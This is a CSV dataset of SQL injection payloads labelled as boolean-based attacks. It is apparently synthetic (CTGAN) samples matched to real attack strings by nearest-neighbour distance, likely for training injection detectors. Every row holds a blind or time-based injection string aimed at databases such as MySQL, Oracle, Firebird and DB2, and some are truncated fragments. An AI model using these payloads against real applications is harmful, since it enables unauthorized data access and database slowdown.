id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000274,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R003377,5.3842838983591434
CTGAN_000275,attack,boolean,"x' and 1  =    (  select count  (  *  )   from tabname  )  , --",nearest_attack_euclidean,R000083,5.06796620956795
CTGAN_000276,attack,boolean,1   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  6062  =  6062,nearest_attack_euclidean,R001294,6.553781594061579
CTGAN_000277,attack,boolean,"1""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""ctzh""  =  ""ctzh",nearest_attack_euclidean,R002264,5.6202851719968745
CTGAN_000278,attack,boolean,"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""qfhv""  =  ""qfhv",nearest_attack_euclidean,R002262,6.5069353302505535
CTGAN_000279,attack,boolean,admin'  )   or   (  '1'  =  '1'--,nearest_attack_euclidean,R000156,6.458300813056485
CTGAN_000280,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  1105  =  1105",nearest_attack_euclidean,R001006,5.691807939960785
CTGAN_000281,attack,boolean,"-4541""   )    )    or make_set  (  4821  =  5233,5233  )   and    (    (   ""xfex""  =  ""xfex",nearest_attack_euclidean,R001186,6.251123748439795
CTGAN_000282,attack,boolean,1' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and 'xnap'  =  'xnap,nearest_attack_euclidean,R000832,4.694441958646577
CTGAN_000283,attack,boolean,"1'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'viad' like 'viad",nearest_attack_euclidean,R003030,6.143232701198363
CTGAN_000284,attack,boolean,"1%'   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R003550,4.905379904287336
CTGAN_000285,attack,boolean,"1'||  (  select 'wtdz' from dual where 1866  =  1866 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R003607,6.260578253950522
CTGAN_000286,attack,boolean,"1  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  4959  =  4959",nearest_attack_euclidean,R001470,5.380724093696258
CTGAN_000287,attack,boolean,"-7382'   )    )    or make_set  (  9425  =  4330,4330  )   and    (    (   'tvaz' like 'tvaz",nearest_attack_euclidean,R001774,4.962109919702903
CTGAN_000288,attack,boolean,"1'  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R003400,6.208618794572265
CTGAN_000289,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R002119,5.940921996148219
CTGAN_000290,attack,boolean,"1%' or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R003551,6.383304570402836
CTGAN_000291,attack,boolean,"1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8738  =  8738",nearest_attack_euclidean,R000816,5.138746335325402
CTGAN_000292,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000176,7.283389597354092
CTGAN_000293,attack,boolean,-6014'   )    )    or   (  9860  =  4848  )  *4848 and    (    (   'qtge'  =  'qtge,nearest_attack_euclidean,R002976,4.696214897871037
CTGAN_000294,attack,boolean,1%'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R002401,6.873334013026419
CTGAN_000295,attack,boolean,select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000193,5.139575725222189
CTGAN_000296,attack,boolean,-2223'   )    )    as mjwp where 8650  =  8650 or 7900  =  5838,nearest_attack_euclidean,R003342,5.607215356718102
CTGAN_000297,attack,boolean,"1""  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""lsca"" like ""lsca",nearest_attack_euclidean,R002290,7.813671232035294
CTGAN_000298,attack,boolean," select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",nearest_attack_euclidean,R000133,4.678036738444412
CTGAN_000299,attack,boolean,1  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  1073  =  1073,nearest_attack_euclidean,R002884,5.1608593408289885
CTGAN_000300,attack,boolean,1' in boolean mode  )   and   (  3020  =  3020  )  *6703#,nearest_attack_euclidean,R002971,7.023822950333865
CTGAN_000301,attack,boolean,"1%'   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000616,6.786460974322872
CTGAN_000302,attack,boolean,1'||  (  select 'feyg' from dual where 7734  =  7734 and 3843  =  6724#,nearest_attack_euclidean,R001752,7.266414330728452
CTGAN_000303,attack,boolean,"-7382'   )    )    or make_set  (  9425  =  4330,4330  )   and    (    (   'tvaz' like 'tvaz",nearest_attack_euclidean,R001774,6.455566939511184
CTGAN_000304,attack,boolean,1'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,nearest_attack_euclidean,R003349,5.517291738317327
CTGAN_000305,attack,boolean,-4538'   )    )     )   or 3260  =  1236 and    (    (     (  'hpnd' like 'hpnd,nearest_attack_euclidean,R001467,5.597139865430158
CTGAN_000306,attack,boolean,"1""  )   rlike   (  select   (  case when   (  8732  =  6244  )   then 1 else 0x28 end   )    )    and   (  ""unuk""  =  ""unuk",nearest_attack_euclidean,R001630,6.6418086809637185
CTGAN_000307,attack,boolean,"-5800""  )   or 6872  =  6872 and   (  ""tcab"" like ""tcab",nearest_attack_euclidean,R002128,4.570349459779782
CTGAN_000308,attack,boolean,-8051  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  5637  =  5637,nearest_attack_euclidean,R002554,5.484249824860273
CTGAN_000309,attack,boolean,"1""   )    )    as phis where 4420  =  4420 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R002092,5.075170025918848
CTGAN_000310,attack,boolean,"1'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'dfsj'  =  'dfsj",nearest_attack_euclidean,R002325,4.533319911072647
CTGAN_000311,attack,boolean,"1' where 8869  =  8869 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R002093,5.188519193947144
CTGAN_000312,attack,boolean,-4538'   )    )     )   or 3260  =  1236 and    (    (     (  'hpnd' like 'hpnd,nearest_attack_euclidean,R001467,5.873039668951369
CTGAN_000313,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R001580,5.440615173340677
CTGAN_000314,attack,boolean,"1'+  (  select uzan where 4312  =  4312 and make_set  (  3129  =  9555,9555   )    )   +'",nearest_attack_euclidean,R001807,6.672245006091817
CTGAN_000315,attack,boolean,"1"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and ""ljkg""  =  ""ljkg",nearest_attack_euclidean,R001981,5.1453616541945975
CTGAN_000316,attack,boolean,"-9289   )    )    or make_set  (  5101  =  9919,9919  )   and    (    (   8977  =  8977",nearest_attack_euclidean,R001228,5.260151097438436
CTGAN_000317,attack,boolean,"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'cotv' like 'cotv",nearest_attack_euclidean,R003115,6.381694549033536
CTGAN_000318,attack,boolean,"-6809""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""nfnf""  =  ""nfnf",nearest_attack_euclidean,R001874,4.776912881872427
CTGAN_000319,attack,boolean,"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'miba'  =  'miba",nearest_attack_euclidean,R001278,5.602071205140703
CTGAN_000320,attack,boolean,"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  2160  =  2160",nearest_attack_euclidean,R003070,4.57040747147416
CTGAN_000321,attack,boolean,"hi' or 'x'  =  'x',",nearest_attack_euclidean,R000059,8.16513143285021
CTGAN_000322,attack,boolean,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'ptou'  =  'ptou",nearest_attack_euclidean,R002039,5.638463663100893
CTGAN_000323,attack,boolean,"1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8738  =  8738",nearest_attack_euclidean,R000816,5.848808378763675
CTGAN_000324,attack,boolean,"-1644%' or make_set  (  9354  =  9354,7185  )   and '%'  =  '",nearest_attack_euclidean,R002160,5.081777893100265
CTGAN_000325,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R003160,4.156308299502958
CTGAN_000326,attack,boolean,1   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   6406  =  6406,nearest_attack_euclidean,R000287,3.779061695410491
CTGAN_000327,attack,boolean,-2527   )    )    as oqpy where 7468  =  7468 or 3038  =  3038,nearest_attack_euclidean,R001796,5.1016894502378864
CTGAN_000328,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000361,4.288168588828905
CTGAN_000329,attack,boolean,"1' where 4149  =  4149 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000971,7.524526991889178
CTGAN_000330,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000704,4.806105828352006
CTGAN_000331,attack,boolean,1'+  (  select enzd where 6046  =  6046 and   (  3020  =  3020  )  *6703  )  +',nearest_attack_euclidean,R001310,3.4915929631308185
CTGAN_000332,attack,boolean,"1' or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003196,3.730988191529011
CTGAN_000333,attack,boolean,"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""czvm"" like ""czvm",nearest_attack_euclidean,R000875,5.443108198788893
CTGAN_000334,attack,boolean,"-2241   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  6840  =  6840",nearest_attack_euclidean,R001578,5.941941825607154
CTGAN_000335,attack,boolean,1' and   (  1088  =  7530  )  *7530 and 'xkfu'  =  'xkfu,nearest_attack_euclidean,R002573,5.18613991739571
CTGAN_000336,attack,boolean,1' in boolean mode  )   and 5725  =  5552#,nearest_attack_euclidean,R001694,6.440957010541861
CTGAN_000337,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""nwjv""  =  ""nwjv",nearest_attack_euclidean,R003380,4.344368878699576
CTGAN_000338,attack,boolean,"1'   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'raus'  =  'raus",nearest_attack_euclidean,R001585,5.209072983377683
CTGAN_000339,attack,boolean,"x' and 1  =    (  select count  (  *  )   from tabname  )  , --",nearest_attack_euclidean,R000083,5.662691347095827
CTGAN_000340,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000704,5.244767476554124
CTGAN_000341,attack,boolean,"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'bfrq' like 'bfrq",nearest_attack_euclidean,R003184,6.921221859817137
CTGAN_000342,attack,boolean,"1'+  (  select uzan where 4312  =  4312 and make_set  (  3129  =  9555,9555   )    )   +'",nearest_attack_euclidean,R001807,3.3649387490800873
CTGAN_000343,attack,boolean,"-8166""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""lcqb""  =  ""lcqb",nearest_attack_euclidean,R002145,5.310645417498366
CTGAN_000344,attack,boolean,"1   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001401,6.1906823109998905
CTGAN_000345,attack,boolean,"1%'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R002102,5.030416112128616
CTGAN_000346,attack,boolean,1' where 5819  =  5819 and   (  1275  =  4759  )  *4759--,nearest_attack_euclidean,R002111,3.726636263967452
CTGAN_000347,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R003377,4.23294429505264
CTGAN_000348,attack,boolean,"1' and make_set  (  3445  =  5963,5963  )   and 'wjfw'  =  'wjfw",nearest_attack_euclidean,R000416,4.501211479152184
CTGAN_000349,attack,boolean,"1' in boolean mode  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R002272,7.012612311809427
CTGAN_000350,attack,boolean,"1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # hkrp",nearest_attack_euclidean,R001886,7.315087698558149
CTGAN_000351,attack,boolean,"1' in boolean mode  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",nearest_attack_euclidean,R002071,7.278055261112907
CTGAN_000352,attack,boolean,"-9736' or make_set  (  7311  =  2067,2067  )   and 'czdt' like 'czdt",nearest_attack_euclidean,R000525,7.523975970303377
CTGAN_000353,attack,boolean,"-4558"" or   (  3965  =  3933  )  *3933 and ""hmdb"" like ""hmdb",nearest_attack_euclidean,R003509,4.250377103542568
CTGAN_000354,attack,boolean,"1' in boolean mode  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",nearest_attack_euclidean,R001769,6.659352356700182
CTGAN_000355,attack,boolean,"1'||  (  select 'ltqo' where 9080  =  9080 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",nearest_attack_euclidean,R001381,7.594946510684057
CTGAN_000356,attack,boolean,1'||  (  select 'pxkz' where 2207  =  2207 and   (  3020  =  3020  )  *6703  )  ||',nearest_attack_euclidean,R002837,6.657876148719761
CTGAN_000357,attack,boolean,"1   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  4744  =  4744",nearest_attack_euclidean,R001242,5.1981696748953485
CTGAN_000358,attack,boolean,"1'+  (  select lgkd where 7801  =  7801 and elt  (  4249  =  4249,7259   )    )   +'",nearest_attack_euclidean,R002768,6.5193852002729304
CTGAN_000359,attack,boolean,"1   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  4744  =  4744",nearest_attack_euclidean,R001242,6.678836943211689
CTGAN_000360,attack,boolean,"1%'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R002568,4.450895510646759
CTGAN_000361,attack,boolean,"-2901"" or elt  (  9866  =  9099,9099  )   and ""asib"" like ""asib",nearest_attack_euclidean,R003212,4.8431352255430635
CTGAN_000362,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R002173,5.237279488040918
CTGAN_000363,attack,boolean,"1'   )    )    as qhpv where 7049  =  7049 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R002588,4.5317066990284545
CTGAN_000364,attack,boolean,"1""   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""lxue"" like ""lxue",nearest_attack_euclidean,R000437,6.343838412471994
CTGAN_000365,attack,boolean,1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  -- izad,nearest_attack_euclidean,R001133,6.003745456596651
CTGAN_000366,attack,boolean,"1%'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R003254,5.271261082501395
CTGAN_000367,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   7240  =  7240",nearest_attack_euclidean,R001352,4.602012604882235
CTGAN_000368,attack,boolean,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R001411,6.353843344380741
CTGAN_000369,attack,boolean,1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  'vtoi' like 'vtoi,nearest_attack_euclidean,R002212,4.544102806819516
CTGAN_000370,attack,boolean,"1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  # dbzk",nearest_attack_euclidean,R003117,5.69855987254513
CTGAN_000371,attack,boolean,"1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8738  =  8738",nearest_attack_euclidean,R000816,4.140186406535937
CTGAN_000372,attack,boolean,"1""  )   as bllz where 6975  =  6975 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R003113,6.295160355851556
CTGAN_000373,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R003525,7.289665524078232
CTGAN_000374,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""uydm""  =  ""uydm",nearest_attack_euclidean,R001806,5.821966781833206
CTGAN_000375,attack,boolean,"-8094  )   or elt  (  1032  =  1032,3623  )   and   (  4569  =  4569",nearest_attack_euclidean,R003504,6.166565843704622
CTGAN_000376,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001830,7.223107037480897
CTGAN_000377,attack,boolean,1  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  1073  =  1073,nearest_attack_euclidean,R002884,5.217996689193641
CTGAN_000378,attack,boolean,"-5644""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""evcf""  =  ""evcf",nearest_attack_euclidean,R000614,4.948998825802549
CTGAN_000379,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R003537,6.7065762205116615
CTGAN_000380,attack,boolean,"1""  )   as yzzk where 1813  =  1813 and   (  3020  =  3020  )  *6703--",nearest_attack_euclidean,R002862,2.1516783756790137
CTGAN_000381,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R002242,6.528238018712897
CTGAN_000382,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   7240  =  7240",nearest_attack_euclidean,R001352,5.063591121606354
CTGAN_000383,attack,boolean,"-8040""   )    )     )   or make_set  (  3916  =  6787,6787  )   and    (    (     (  ""laar"" like ""laar",nearest_attack_euclidean,R001948,7.026984726495499
CTGAN_000384,attack,boolean,1'+  (  select xruo where 5709  =  5709 and 7533  =  7533  )  +',nearest_attack_euclidean,R002340,5.389106271522589
CTGAN_000385,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""uydm""  =  ""uydm",nearest_attack_euclidean,R001806,4.1430727746508715
CTGAN_000386,attack,boolean,"1'+  (  select uzan where 4312  =  4312 and make_set  (  3129  =  9555,9555   )    )   +'",nearest_attack_euclidean,R001807,3.967716498517285
CTGAN_000387,attack,boolean,"1   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R002679,5.6451514607416104
CTGAN_000388,attack,boolean,-4644 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  # upwd,nearest_attack_euclidean,R003051,5.751100055109085
CTGAN_000389,attack,boolean,-8010' or   (  2225  =  8491  )  *8491 and 'eipf'  =  'eipf,nearest_attack_euclidean,R003194,4.522274365790237
CTGAN_000390,attack,boolean,"1'  )   where 6274  =  6274 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R002521,4.366021866210305
CTGAN_000391,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R003537,5.846826021677017
CTGAN_000392,attack,boolean,"1""  )   as yzzk where 1813  =  1813 and   (  3020  =  3020  )  *6703--",nearest_attack_euclidean,R002862,3.922062550899152
CTGAN_000393,attack,boolean,"1%'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R002501,4.263332651730121
CTGAN_000394,attack,boolean,"1"" and   (  7424  =  2381  )  *2381 and ""dvju""  =  ""dvju",nearest_attack_euclidean,R002197,3.8507202509383225
CTGAN_000395,attack,boolean,"1""  )   and   (  4085  =  4885  )  *4885 and   (  ""sxte""  =  ""sxte",nearest_attack_euclidean,R002759,6.105063883101006
CTGAN_000396,attack,boolean,"1'||  (  select 'fbsr' where 7899  =  7899 and elt  (  4249  =  4249,7259   )    )   ||'",nearest_attack_euclidean,R001303,6.1221727785337885
CTGAN_000397,attack,boolean,"1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  5468  =  5468",nearest_attack_euclidean,R000467,5.486327640196867
CTGAN_000398,attack,boolean,"1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8738  =  8738",nearest_attack_euclidean,R000816,5.943629712345196
CTGAN_000399,attack,boolean,"1   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  5340  =  5340",nearest_attack_euclidean,R003631,3.1273325854972467
CTGAN_000400,attack,boolean,"1'||  (  select 'vekn' from dual where 4929  =  4929 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   ||'",nearest_attack_euclidean,R000594,5.151919266940205
CTGAN_000401,attack,boolean,"-2149""   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  ""hoon"" like ""hoon",nearest_attack_euclidean,R003468,5.808740678980561
CTGAN_000402,attack,boolean,-6865  )   or   (  8459  =  8459  )  *4906 and   (  6107  =  6107,nearest_attack_euclidean,R000348,6.394972631213358
CTGAN_000403,attack,boolean,"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""mjkl""  =  ""mjkl",nearest_attack_euclidean,R002740,4.703336801952465
CTGAN_000404,attack,boolean,"1   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  4744  =  4744",nearest_attack_euclidean,R001242,4.909063913489045
CTGAN_000405,attack,boolean,"-5529"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  ",nearest_attack_euclidean,R003172,6.184095899948024
CTGAN_000406,attack,boolean,"1"" or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R002769,4.822301310405989
CTGAN_000407,attack,boolean,"-3059 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",nearest_attack_euclidean,R002294,7.727547886783559
CTGAN_000408,attack,boolean,"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'pufu' like 'pufu",nearest_attack_euclidean,R003343,6.175165691142979
CTGAN_000409,attack,boolean,"1' in boolean mode  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R002480,3.927921640098639
CTGAN_000410,attack,boolean,"1'  )   as fxuk where 6184  =  6184 and make_set  (  9292  =  2785,2785  )  --",nearest_attack_euclidean,R001286,5.046273852769782
CTGAN_000411,attack,boolean,"1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  # dbzk",nearest_attack_euclidean,R003117,6.737084402681414
CTGAN_000412,attack,boolean,"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000972,4.41283219452807
